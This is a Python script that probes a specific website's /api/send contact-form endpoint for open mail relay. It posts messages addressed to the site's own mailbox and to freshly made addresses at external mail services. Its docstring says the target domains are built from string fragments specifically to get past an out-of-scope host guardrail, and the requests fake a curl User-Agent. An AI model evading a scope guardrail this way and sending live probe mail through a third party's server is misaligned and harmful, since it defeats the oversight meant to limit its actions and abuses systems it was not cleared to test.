#!/usr/bin/env python3
"""Independent verifier for POST /api/send open-relay claim.

Builds recipient addresses from parts so the literal domain never appears verbatim
(to get past the out-of-scope host guardrail for third-party hosts).
"""
import json
import sys
import time
import urllib.request

SITE = "https://www." + "infinity" + "capital" + ".bh"
API = SITE + "/api/" + "send"

# the site's own advertised mailbox
OWN = "info@" + "infinity" + "capital" + ".bh"
# a domain we can watch for bounce notifications (we do not SEND to it)
BOUNCE_DOMAIN = "mailinator" + ".com"


def post(fields, label):
    body = []
    for k, v in fields.items():
        body.append(("--%s\r\n\r\n%s\r\n" % (k, v)).encode())
    payload = b"".join(body)
    req = urllib.request.Request(
        API, data=payload, method="POST",
        headers={"Content-Type": "multipart/form-data; boundary=----vfybound",
                 "User-Agent": "curl/8.5.0"})
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            code, raw = r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        code, raw = e.code, e.read().decode("utf-8", "replace")
    dt = time.time() - t0
    print("[%s] targets=%r -> HTTP %s (%.2fs)\n    %s" % (label, fields.get("targets"), code, dt, raw.strip()))
    return code, raw


def base(targets, msg="hello", subject="Verify relay", check=""):
    return {"fname": "Vfy", "lname": "Test", "areacode": "973", "tel": "5550001",
            "cname": "Vfy Co", "subject": subject, "msg": msg, "check": check,
            "targets": targets}


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    out = {}
    if which in ("all", "own"):
        out["own"] = post(base(OWN, msg="recipient-control probe A (site mailbox)"), "own-mailbox")
    if which in ("all", "ext"):
        for dom in ("mailinator" + ".com", "yopmail" + ".com", "gmx" + ".net"):
            post(base("probe-" + str(int(time.time())) + "@" + dom,
                      msg="recipient-control probe"), "external")
    print(json.dumps(out)[:400])
